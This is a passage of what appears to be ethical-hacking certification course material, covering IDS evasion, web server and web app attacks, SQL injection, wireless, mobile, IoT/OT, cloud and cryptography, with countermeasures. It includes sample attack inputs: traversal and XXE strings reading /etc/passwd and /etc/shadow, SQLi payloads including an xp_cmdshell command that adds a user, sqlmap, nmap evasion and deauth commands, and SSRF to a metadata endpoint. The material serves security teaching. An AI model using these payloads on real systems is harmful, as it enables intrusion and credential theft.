  • TCP Session Hijacking: To successfully inject packets into an active TCP session, the attacker must accurately predict the TCP sequence numbers being used. TCP uses these sequence numbers to ensure packets are received in order; incorrect sequence numbers result in the packets being dropped.
  • Network Sniffing: Attackers use network protocol analyzers like Wireshark to sniff network traffic and extract session cookies from unencrypted HTTP communications. Historically, tools like Ferret and Hamster were also used for this purpose.

topics.title: Session Hijacking Countermeasures
topics.content:
Securing sessions requires multiple defense-in-depth strategies:

  • Secure Token Generation: Session tokens should be generated using cryptographically secure random number generators to thwart session prediction attacks.
  • Regeneration & Invalidation: To prevent session fixation, servers must regenerate the session ID and invalidate the pre-authentication session ID upon login.
  • HttpOnly Flag: Setting the HttpOnly attribute on session cookies instructs the browser to prevent client-side scripts (like JavaScript) from accessing the cookie, serving as a critical defense against XSS-based session theft.
  • Token Binding: Binding the session to additional client-specific attributes (such as IP address, User-Agent string, and device fingerprint) makes stolen session tokens much harder to reuse from a different machine.
  • Avoid URL-based Tracking: URL-based session tracking is insecure because tokens can easily leak through HTTP Referer headers or browser history.

v13Updates: Advanced token prediction with machine learning

modules.title: Evading IDS, Firewalls, and Honeypots
modules.description: Explains how intrusion detection systems, firewalls, and honeypots work, and covers various evasion techniques used by attackers to bypass these security controls.
objectives: Understand IDS, IPS, and firewall architectures and detection methods
Perform IDS evasion using fragmentation, obfuscation, and encryption
Bypass firewall rules using tunneling and covert channels
Identify and evade honeypots and honeynets
Understand NAC and endpoint security evasion

topics.title: IDS/IPS Concepts
topics.content:
An Intrusion Detection System (IDS) is designed to monitor network traffic or system activities and generate alerts when suspicious or malicious behavior is detected. Unlike an Intrusion Prevention System (IPS), a standard IDS does not actively block traffic; it only detects and alerts administrators.

IDS Sensor Placement: For maximum visibility into incoming threats, an IDS sensor should be connected to a SPAN (Switched Port Analyzer) or mirror port on the border router or just inside the firewall. This allows the IDS to passively see copies of all traffic entering and leaving the network without affecting network performance.

topics.title: IDS Evasion Techniques
topics.content:
Attackers use various techniques to bypass IDS inspection:

  • Fragmentation Attacks: Attackers fragment malicious packets into very small pieces (e.g., using Nmap's -f flag). Many IDS systems struggle to reassemble fragmented packets correctly, while the target host correctly reassembles the original malicious payload.
  • TTL-Based Insertion Attacks: The attacker sends extra packets with low Time-To-Live (TTL) values. These packets reach the IDS (which is positioned closer) but expire before reaching the target host. The IDS sees the extra packets and reassembles a benign payload, causing it to miss the attack.
  • Obfuscation and URL Encoding: Attackers encode payloads to evade signature matching. For example, URL encoding /../../etc/passwd as %2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd. Signature-based IDS may fail to decode URL-encoded characters before pattern matching, allowing the attack to bypass detection rules.
  • Polymorphic Shellcode: Advanced attackers use self-modifying code techniques to change the binary pattern of the shellcode on each execution while maintaining the same functionality. This completely defeats signature-based IDS because no two instances share the same byte pattern.
  • Advanced Scanning Evasion: Attackers can combine techniques, such as using nmap -f -T0 -D RND:10 <target>, which combines fragmentation (-f), extremely slow 'paranoid' timing (-T0, 5 minutes between probes) to avoid time-based detection, and generating 10 random decoy IP addresses (-D RND:10) to obscure the real scanning source.

topics.title: Firewall Bypass Techniques
topics.content:
Firewalls filter traffic based on IP addresses, ports, and protocols. To bypass these restrictions, attackers often use tunneling techniques.

For example, if a penetration tester needs to bypass a firewall that only allows outbound HTTP and HTTPS traffic, the most effective technique for establishing a reverse shell is to tunnel the reverse shell over HTTP/HTTPS on port 443. Since the firewall permits outbound HTTPS traffic, encapsulating the reverse shell communication within HTTPS makes it appear as legitimate encrypted web traffic, effectively bypassing port-based firewall rules.

topics.title: Honeypots and Honeynets
topics.content:
Honeypots are decoy systems designed to attract attackers.

  • High-Interaction vs. Low-Interaction: High-interaction honeypots use real operating systems and services, providing a full environment for attackers to interact with, enabling the capture of detailed attack methods and zero-day exploits. Low-interaction honeypots only simulate specific services and provide limited information.
  • Honeynet Indicators: A honeynet is a decoy network segment. The most reliable indicator that an attacker has landed in a honeynet is the absence of legitimate activity. A network with no real users, no legitimate outbound traffic, and no real production data is a strong indicator of a decoy environment.

modules.title: Hacking Web Servers
modules.description: Covers web server architectures, common vulnerabilities, and attack techniques including directory traversal, misconfiguration exploitation, and web server hardening best practices.
objectives: Understand web server architecture and common platforms
Identify web server vulnerabilities and misconfigurations
Perform directory traversal and web server exploitation
Use web server scanning tools for vulnerability assessment
Implement web server hardening countermeasures

topics.title: Web Server Architecture and Misconfigurations
topics.content:
Web servers (such as Apache, Nginx, IIS) are often deployed with critical security misconfigurations.

  • Default Installations: Leaving default credentials, sample applications, and unnecessary services enabled is one of the most dangerous web server misconfigurations. Attackers frequently check for default admin pages and sample scripts.
  • Information Disclosure: Verbose error messages that reveal stack traces, database connection strings, and internal file paths provide attackers with valuable intelligence. This information aids attackers in understanding the server's architecture and crafting targeted attacks.
  • Host Header Injection: If a web server handles virtual hosting but fails to validate the HTTP Host header, attackers can manipulate it. This facilitates attacks like web cache poisoning or password reset poisoning.
  • HTTP Response Splitting: This attack involves injecting malicious CRLF (Carriage Return Line Feed) characters into HTTP headers to manipulate how the response is processed by the client or intermediary cache, effectively splitting one response into two.

topics.title: Directory Traversal Attacks
topics.content:
Directory traversal (path traversal) exploits insufficient input validation to access files outside the intended web root directory. An attacker uses sequences like ../ to navigate the file system (e.g., accessing /etc/passwd).

  • Filter Evasion (Double Encoding): If a server filters basic ../ sequences, attackers might use ....//. When the basic filter removes ../ from ....//, it leaves behind ../, successfully bypassing the control.
  • CVE-2021-41773 (Apache Path Traversal): A notable vulnerability in Apache 2.4.49 caused by a flaw in the path normalization process that failed to properly handle percent-encoded directory traversal sequences (like %2e). It allowed attackers to bypass access controls and, with mod_cgi enabled, achieve Remote Code Execution.

topics.title: Web Server Attack Methodology & Scanning
topics.content:
Vulnerability scanning is a crucial step in attacking or defending web servers.

  • Nikto: Nikto is an open-source web server scanner specifically designed to perform comprehensive tests against web servers. It checks for over 6,700 potentially dangerous files, outdated server software, and server configuration issues.
  • Risk Prioritization: When reviewing scanner findings, prioritize data exposure. For example, finding a publicly accessible database backup file (e.g., backup.sql) presents the highest immediate risk compared to directory indexing or Apache version disclosure, because the backup file likely contains sensitive user credentials and schema details.

topics.title: Web Server Hardening
topics.content:
Hardening a web server involves multiple defensive layers:

  • Remove all default installations, sample files, and unnecessary services.
  • Configure generic error messages for production environments and log detailed errors internally.
  • Implement the HTTP Strict-Transport-Security (HSTS) header. HSTS instructs web browsers to only connect to the server using HTTPS, preventing SSL stripping and protocol downgrade attacks.
  • Validate and whitelist the Host header to prevent injection attacks.

modules.title: Hacking Web Applications
modules.description: Deep dive into web application vulnerabilities based on the OWASP Top 10, covering XSS, CSRF, SSRF, broken authentication, and modern web application attack techniques.
objectives: Understand the OWASP Top 10 vulnerability categories
Perform Cross-Site Scripting (XSS), CSRF, and SSRF attacks
Exploit broken authentication and insecure deserialization
Use web application testing tools and proxies
Implement secure coding practices and WAF protections

topics.title: OWASP Top 10 Overview and Access Control
topics.content:
The OWASP Top 10 (2021) outlines the most critical web application security risks, with Broken Access Control ranked as the number one risk (replacing Injection from previous years). Broken Access Control occurs when users can act outside their intended permissions.

A prime example of Broken Access Control is Insecure Direct Object References (IDOR). IDOR occurs when an application provides direct access to objects based on user-supplied input without proper authorization checks. For instance, if an attacker changes an API URL from /api/user/1234/profile to /api/user/1235/profile and successfully views another user's data, they have exploited an IDOR vulnerability.

topics.title: Cross-Site Scripting (XSS) and XXE Injection
topics.content:
Cross-Site Scripting (XSS) allows attackers to execute malicious scripts in the victim's browser.

  • Stored vs. Reflected XSS: Stored (persistent) XSS occurs when the malicious script is saved on the server (e.g., in a database or forum post) and executes every time a user views the affected page. Reflected (non-persistent) XSS requires the victim to click a specially crafted URL containing the malicious script, which is then reflected back by the server.

XML External Entity (XXE) Injection: XXE targets XML parsers. An attacker submits an XML payload with a malicious <!DOCTYPE> declaration defining an external entity (e.g., <!ENTITY xxe SYSTEM "file:///etc/shadow">). When the parser processes the entity (&xxe;), it replaces it with the contents of the target file, leading to sensitive file disclosure. Mitigation involves disabling external entity processing in XML parsers.

topics.title: CSRF, SSRF, and Insecure File Uploads
topics.content:
Cross-Site Request Forgery (CSRF): An attack where the client is tricked into making unintended, authenticated requests. For example, an attacker hosts a hidden HTML form pointing to a banking transfer URL and uses JavaScript (<script>document.forms[0].submit();</script>) to auto-submit it. To defend against CSRF, applications use random tokens. However, for anti-CSRF tokens to be effective, the server must validate that the token matches a value stored on the server for that specific session before processing the request.

Server-Side Request Forgery (SSRF): An attack where the attacker makes the server send requests to unintended internal or external resources. A common SSRF target in cloud environments is the cloud instance metadata endpoint (e.g., http://169.254.169.254/latest/meta-data/). If successful, attackers can retrieve sensitive IAM credentials, API keys, and infrastructure configurations.

Insecure File Uploads: If a server only validates file extensions (like .jpg or .png) to secure uploads, an attacker can bypass this by uploading a PHP web shell with a double extension (e.g., shell.php.jpg) or by modifying the Content-Type header.

topics.title: Authentication and Session Vulnerabilities
topics.content: Authentication mechanisms are frequently targeted. In modern web applications using JSON Web Tokens (JWT) for authentication, a critical vulnerability is JWT Algorithm Confusion. An attacker can modify the JWT header to specify {"alg":"none"} and remove the digital signature. If the server is misconfigured and accepts the 'none' algorithm, it fails to validate the signature, allowing the attacker to forge arbitrary tokens with elevated claims (like admin privileges).

modules.title: SQL Injection
modules.description: In-depth coverage of SQL injection attack types (in-band, blind, out-of-band), exploitation techniques with sqlmap, and comprehensive prevention through parameterized queries and input validation.
objectives: Understand SQL injection concepts and attack types
Perform in-band, blind, and out-of-band SQL injection
Use SQLMap for automated SQL injection testing
Extract data, escalate privileges, and execute OS commands via SQLi
Implement SQL injection countermeasures

topics.title: SQL Injection Fundamentals
topics.content:
SQL Injection (SQLi) occurs when untrusted user input is concatenated directly into database queries without proper parameterization. This allows attackers to manipulate the query logic.

A classic example is Authentication Bypass. If an attacker enters ' OR '1'='1' -- into a username field, the single quote closes the string, OR '1'='1' injects a condition that always evaluates to true, and -- comments out the remainder of the query (such as password verification). This causes the database to return all users, typically logging the attacker in as the first user in the database (often the administrator).

topics.title: In-Band SQL Injection
topics.content:
In-band SQL injection (or classic SQLi) occurs when the attacker uses the same communication channel to launch the attack and directly retrieve the results in the application's HTTP response.

  • Error-based SQLi: Extracts data by intentionally causing database errors that leak schema or data details in the error message.
  • UNION-based SQLi: Uses the UNION SELECT operator to combine results from the injected query with the original query's results. Before a UNION-based attack can work, the attacker must first determine the exact number of columns in the original SELECT query (often achieved using ORDER BY clauses or incrementing NULL values).

topics.title: Blind SQL Injection
topics.content:
Blind SQL Injection is used when the application does not display query results or error messages directly in the response.

  • Boolean-Based Blind SQLi: The attacker infers information by asking the database true/false questions and observing if the application returns a different or empty page. For example, comparing the response of /products?id=1 AND 1=1 (true condition returning a normal page) against /products?id=1 AND 1=2 (false condition returning a different page).
  • Time-Based Blind SQLi: The attacker infers true/false conditions by injecting time delay functions and measuring the server's response time. For example, using Microsoft SQL Server's WAITFOR DELAY '0:0:5' or MySQL's SLEEP(). If a condition is true, the server waits 5 seconds before responding.

topics.title: Advanced SQL Injection & Evasion
topics.content:
Advanced SQLi techniques extend beyond simple data extraction:

  • Second-Order SQL Injection: Also known as stored SQLi, the malicious payload is stored safely in the database during the initial request (passing entry validation). The payload is triggered later when a different application function retrieves the stored data and uses it in a new SQL query without parameterization. It is particularly dangerous because it bypasses initial input validation.
  • OS Command Execution: Attackers can escalate SQL injection to operating system-level access. In Microsoft SQL Server, the xp_cmdshell extended stored procedure allows executing OS commands. An attacker can inject '; EXEC xp_cmdshell 'net user hacker P@ss123 /add' -- to create a new Windows user account on the database server.
  • WAF Evasion: When standard SQL keywords (like UNION or SELECT) are blocked by a Web Application Firewall (WAF), attackers use advanced evasion techniques. These include case variation (SeLeCt), inline comments to break up words (SEL/**/ECT), or URL/hex encoding. These exploit parsing differences between the WAF and the backend database.
  • SQLMap Automation: Attackers use tools like sqlmap to automate SQLi testing. For example, the command sqlmap -u 'http://target.com/page?id=1' --dbs --batch tests the 'id' parameter for vulnerabilities and attempts to enumerate all database names non-interactively.

topics.title: SQL Injection Countermeasures
topics.content:
Parameterized queries (prepared statements) with bound parameters are the most effective defense against all forms of SQL injection. Parameterization completely separates the SQL code structure from the user-supplied data. The database engine treats user input strictly as literal data, never as executable SQL code, regardless of the characters contained in the input.

While Web Application Firewalls (WAFs) and input filtering (like stripping single quotes) provide defense-in-depth, they are secondary controls that can often be bypassed by skilled attackers using obfuscation and encoding techniques.

modules.title: Hacking Wireless Networks
modules.description: Covers wireless network standards, encryption protocols (WEP through WPA3), wireless attack techniques including evil twin and KRACK, and Bluetooth hacking methods.
objectives: Understand wireless networking standards and encryption protocols
Differentiate between WEP, WPA, WPA2, and WPA3 security
Perform wireless network attacks using Aircrack-ng suite
Set up evil twin and rogue access point attacks
Identify Bluetooth vulnerabilities and attacks

topics.title: Wireless Standards and Encryption
topics.content:
IEEE 802.11 standards define wireless networking: 802.11a (5GHz, 54Mbps), 802.11b (2.4GHz, 11Mbps), 802.11g (2.4GHz, 54Mbps), 802.11n (Wi-Fi 4, dual-band, 600Mbps), 802.11ac (Wi-Fi 5, 5GHz, multi-Gbps), and 802.11ax (Wi-Fi 6/6E).

  • WEP: Uses RC4 with a 24-bit IV (broken).
  • WPA: Uses TKIP (improved but deprecated).
  • WPA2: Uses AES-CCMP (Counter Mode with Cipher Block Chaining Message Authentication Code Protocol) as its mandatory encryption standard. It provides both data confidentiality (via AES in counter mode) and data integrity (via CBC-MAC).
  • WPA3: Replaces WPA2's Pre-Shared Key (PSK) with Simultaneous Authentication of Equals (SAE), also known as the Dragonfly handshake. SAE is a zero-knowledge proof protocol providing forward secrecy and protecting against offline dictionary attacks because each handshake requires live interaction with the access point.

topics.title: Wireless Attack Techniques and Vulnerabilities
topics.content:
Wireless attacks exploit protocol weaknesses and misconfigurations.

  • WPA2 Handshake Cracking: Attackers capture the 4-way handshake and perform offline dictionary or brute-force attacks using tools like Aircrack-ng or Hashcat. The handshake itself doesn't contain the password but has enough data to verify guesses offline.
  • Deauthentication Attacks: Attackers can force clients to disconnect using tools like aireplay-ng. For example, aireplay-ng -0 5 -a [BSSID] -c [Client MAC] sends 5 deauth frames to force a client to reconnect, allowing the attacker to capture the handshake.
  • KRACK (Key Reinstallation Attack): Exploits a flaw in the WPA2 4-way handshake by manipulating and replaying messages to force reinstallation of an already-in-use encryption key. This resets the nonce, allowing attackers to replay, decrypt, and forge packets.
  • WPS Flaws: Wi-Fi Protected Setup (WPS) uses an 8-digit PIN validated in two halves, reducing the brute-force space to ~11,000 combinations. Tools like Reaver or Bully exploit this to recover the WPA/WPA2 passphrase.

topics.title: Evil Twin and Rogue Access Points
topics.content:
An Evil Twin attack involves setting up a malicious access point with the same SSID as a legitimate network, often with a stronger signal, tricking users into connecting. Once connected, the attacker intercepts all traffic, capturing credentials and performing Man-in-the-Middle (MitM) attacks.

This is often combined with a Captive Portal Phishing attack, where the attacker presents a fake corporate login page to steal credentials. Enterprise WPA2 attacks targeting PEAP-MSCHAPv2 use an evil twin and a rogue RADIUS server to capture MSCHAPv2 challenge-response hashes, which are then cracked offline (e.g., using asleap or hashcat). Proper certificate validation on the client side mitigates this.

topics.title: Bluetooth Hacking
topics.content:
Bluetooth attacks exploit short-range wireless communication:

  • Bluejacking: Sending unsolicited messages or business cards (vCards) to nearby Bluetooth devices. It is mostly a nuisance but shows the device is discoverable.
  • Bluesnarfing: Unauthorized data extraction (contacts, messages, files) from vulnerable devices.
  • Bluebugging: Taking full control of a device to make calls, send messages, and access the internet.
  • BlueBorne: A set of vulnerabilities allowing remote code execution without pairing.
  • KNOB: Key Negotiation of Bluetooth, forcing weak encryption keys.

modules.title: Hacking Mobile Platforms
modules.description: Explores Android and iOS security architectures, mobile attack vectors, OWASP Mobile Top 10 vulnerabilities, and mobile device management bypass techniques.
objectives: Understand Android and iOS security architectures
Identify OWASP Mobile Top 10 vulnerabilities
Perform jailbreaking and rooting for security testing
Analyze mobile applications for security weaknesses
Implement mobile security countermeasures and MDM solutions

topics.title: Mobile Platform Architecture & Sandboxing
topics.content:
Mobile platforms use sandboxing to protect user data. Android Application Sandbox leverages Linux's user-based protection model. Each app runs as a separate Linux user with a unique UID in its own process, preventing apps from accessing each other's data, memory, and resources by default.

Android APKs must be digitally signed to verify the developer's identity and ensure code integrity. Unsigned APKs cannot be installed without the user explicitly enabling 'Install from Unknown Sources' or using ADB.

topics.title: Rooting, Jailbreaking, and MDM Bypass
topics.content:
Rooting (Android) and Jailbreaking (iOS) achieve similar goals: bypassing manufacturer restrictions and gaining elevated (root/admin) privileges. This process disables critical OS security controls like application sandboxing, mandatory code signing, and app store restrictions.

When an enterprise Mobile Device Management (MDM) solution is bypassed via jailbreaking tools (e.g., unc0ver), it exposes corporate data to unauthorized access and malware, creating a severe data exfiltration risk. This requires immediate incident response.

topics.title: OWASP Mobile Top 10 & App Vulnerabilities
topics.content:
The OWASP Mobile Top 10 (2024) identifies critical risks. M1: Improper Credential Usage is the #1 risk, encompassing hardcoded credentials, insecure API keys, and insecure credential transmission.

Another major risk is Insecure Data Storage. For example, Android SharedPreferences files are stored as unencrypted XML files in /data/data/<package_name>/shared_prefs/. With root access, an attacker can easily read these files and extract sensitive data.

Without Certificate Pinning, an app trusts any certificate signed by a trusted CA. An attacker who installs a rogue CA certificate on the device can perform Man-in-the-Middle (MitM) attacks on HTTPS traffic. Pinning ensures the app only trusts specific certificates or public keys.

topics.title: Mobile Attack Vectors & Dynamic Instrumentation
topics.content:
Mobile malware often disguises itself as benign apps (e.g., a flashlight app) but requests excessive and unnecessary permissions like READ_SMS, READ_CONTACTS, RECORD_AUDIO, ACCESS_FINE_LOCATION, and CAMERA, acting as spyware or a Trojan.

Advanced Android malware evades static analysis and app store scanners using Dynamic Code Loading. Tools like DexClassLoader can load a secondary DEX file from a remote server at runtime. Since the malicious payload isn't in the original APK, it bypasses pre-installation checks.

Security researchers use tools like Frida for dynamic instrumentation. Frida injects JavaScript into running processes, allowing runtime modification of app behavior, method hooking, and bypassing security controls like root detection and SSL pinning.

modules.title: IoT and OT Hacking
modules.description: Covers Internet of Things architecture and protocols, OT/SCADA/ICS security concepts, IoT attack surfaces, and the unique security challenges of operational technology environments.
objectives: Understand IoT architecture, protocols, and communication standards
Identify IoT attack surfaces and common vulnerabilities
Explain OT/SCADA/ICS concepts and attack vectors
Perform IoT device security assessment
Implement IoT and OT security best practices

topics.title: IoT Protocols: MQTT, CoAP, and Zigbee
topics.content:
IoT utilizes protocols tailored for constrained environments:

  • MQTT (Message Queuing Telemetry Transport): A lightweight publish-subscribe messaging protocol. Devices publish messages to topics, and a central broker manages distribution. Subscribing to the wildcard topic '#' matches all topics; if a broker lacks ACLs, an attacker can access all sensor data, commands, and credentials.
  • CoAP (Constrained Application Protocol): A lightweight, UDP-based RESTful protocol designed for constrained devices, reducing overhead compared to TCP-based HTTP.
  • Zigbee: An IEEE 802.15.4-based wireless protocol for low-power, short-range mesh networking, common in smart home automation and industrial sensors.

topics.title: IoT Attack Surface and Vulnerabilities
topics.content:
A critical and widespread vulnerability in IoT is the use of default or hardcoded credentials (e.g., admin/admin), which the Mirai botnet heavily exploited.

Another major issue is the lack of proper cryptography. For example, a smart lock communicating over unencrypted HTTP and accepting unsigned firmware updates is highly vulnerable to MitM traffic interception and malicious firmware injection.

Furthermore, if an IoT manufacturer embeds the same private RSA key in the firmware of all devices of a specific model, extracting the key from one device compromises the encrypted communications of all devices in that product line.

topics.title: OT/SCADA Security and Protocols
topics.content:
SCADA (Supervisory Control and Data Acquisition) systems monitor and control industrial processes. They are high-value targets because compromising them can cause severe physical damage to critical infrastructure.

OT protocols often lack security. Modbus TCP, for instance, has no built-in authentication or encryption. Any device on the network can read and write PLC registers without credentials, allowing attackers to send crafted packets that modify critical processes (e.g., chemical dosing in a water plant).

topics.title: The Purdue Model for ICS/SCADA
topics.content: To protect OT environments from IT network threats, organizations use the Purdue Model (Purdue Enterprise Reference Architecture). It is a hierarchical network segmentation model that defines security zones and levels (0-5) for industrial control systems, from the physical process level up to the enterprise network, ensuring proper isolation and controlled access.

modules.title: Cloud Computing
modules.description: Covers cloud computing service models, shared responsibility, cloud-specific threats and attacks, container security, serverless risks, and Zero Trust architecture for cloud environments.
objectives: Understand cloud service models (IaaS, PaaS, SaaS) and deployment types
Explain the shared responsibility model for cloud security
Identify cloud-specific threats and attack vectors
Assess container (Docker/Kubernetes) and serverless security
Implement Zero Trust architecture in cloud environments

topics.title: Cloud Fundamentals and Shared Responsibility
topics.content: In an IaaS (Infrastructure as a Service) deployment, the cloud provider secures the underlying hardware, hypervisor, and network. Under the shared responsibility model, the customer (tenant) is fully responsible for securing and patching the guest operating system, applications, and data.

topics.title: Cloud Threats and IAM Misconfigurations
topics.content:
Misconfigurations are a primary cloud threat. An AWS S3 bucket with its ACL set to public-read allows anyone on the internet to list and download all objects without authentication, leading to severe data breaches.

Identity and Access Management (IAM) requires the principle of least privilege. An AWS policy with {"Effect": "Allow", "Action": "*", "Resource": "*"} grants full administrative access to all resources. If compromised, an attacker has total control over the account.

Attackers can also exploit SSRF to access the EC2 instance metadata service at http://169.254.169.254/latest/meta-data/ and steal temporary IAM credentials, which can be used externally. AWS IMDSv2 mitigates this by requiring a PUT request and a session token.

topics.title: Container and Serverless Security
topics.content:
Container Escape occurs when an attacker breaks out of a container's isolation to access the host system or other containers. Running Docker containers as root is extremely dangerous; if an escape occurs, the attacker inherits root access on the host. Containers should run as non-root users.

In Kubernetes, running pods with hostNetwork: true and privileged: true effectively breaks container isolation, giving the pod direct access to the host's network interfaces and full kernel capabilities.

Serverless Computing (FaaS) introduces risks such as over-privileged IAM roles, insecure dependencies, injection attacks via event data, and sensitive data exposure in plaintext environment variables.

topics.title: Zero Trust and CSPM
topics.content:
The Zero Trust security model assumes no user, device, or network is inherently trusted. It requires continuous verification of identity and authorization for every access request, regardless of whether it originates inside or outside the network perimeter.

To maintain security in multi-cloud environments, organizations use CSPM (Cloud Security Posture Management) tools. CSPM continuously monitors cloud infrastructure configurations, detects misconfigurations, identifies compliance violations, and highlights security risks.

modules.title: Cryptography
modules.description: Comprehensive coverage of cryptographic concepts including symmetric and asymmetric encryption, hashing, PKI, digital certificates, blockchain, and the emerging field of post-quantum cryptography.
objectives: Understand symmetric and asymmetric encryption algorithms
Explain hashing algorithms and their security properties
Describe PKI components and digital certificate management
Identify cryptanalysis techniques and their applications
Explain post-quantum cryptography and blockchain concepts

topics.title: Encryption Types and Vulnerabilities
topics.content:
Symmetric encryption uses a single shared key for both encryption and decryption (e.g., AES, DES). Asymmetric encryption uses a mathematically related key pair — a public key for encryption and a private key for decryption (e.g., RSA, ECC).

In symmetric encryption modes like AES-256-CBC, reusing the same key and Initialization Vector (IV) for different messages causes identical plaintext blocks to produce identical ciphertext blocks, leaking information about the plaintext structure and enabling pattern analysis.

For full disk encryption (e.g., AES-256-XTS), if a device is in sleep mode, the encryption keys remain in RAM. This makes it vulnerable to a Cold Boot attack, where an attacker cools the RAM and dumps its contents to extract the keys.

topics.title: Hashing, Salting, and Digital Signatures
topics.content:
A cryptographic hash function (like SHA-256) generates a fixed-size digest from any input. Collision resistance is the property that ensures it is computationally infeasible to find two different inputs that produce the same hash.

Attackers use precomputed rainbow tables to reverse password hashes. This is defeated by Salting—adding a unique random value to each password before hashing, which ensures identical passwords produce different hashes.

A Digital Signature provides integrity, authentication, and non-repudiation. The sender hashes the message and encrypts the hash with their private key. The recipient decrypts it with the sender's public key and verifies the hash against the message.

topics.title: PKI and Blockchain
topics.content:
Public Key Infrastructure (PKI) manages digital certificates and public-key encryption. The Certificate Authority (CA) is the trusted entity that issues, validates, and revokes digital certificates.

Blockchain ensures data integrity and immutability. Each block contains a cryptographic hash of the previous block, creating a chain where altering any data changes its hash, thus invalidating all subsequent blocks.

topics.title: Quantum Computing and Post-Quantum Cryptography
topics.content:
Quantum computing (via Shor's algorithm) threatens asymmetric encryption by efficiently factoring large numbers and solving discrete logarithms, effectively breaking RSA, ECC, and Diffie-Hellman.

To counter this, NIST has standardized post-quantum algorithms: CRYSTALS-Kyber (ML-KEM) for key encapsulation (key exchange) and CRYSTALS-Dilithium (ML-DSA) for digital signatures. Both rely on lattice-based cryptography, which is believed to be quantum-resistant.
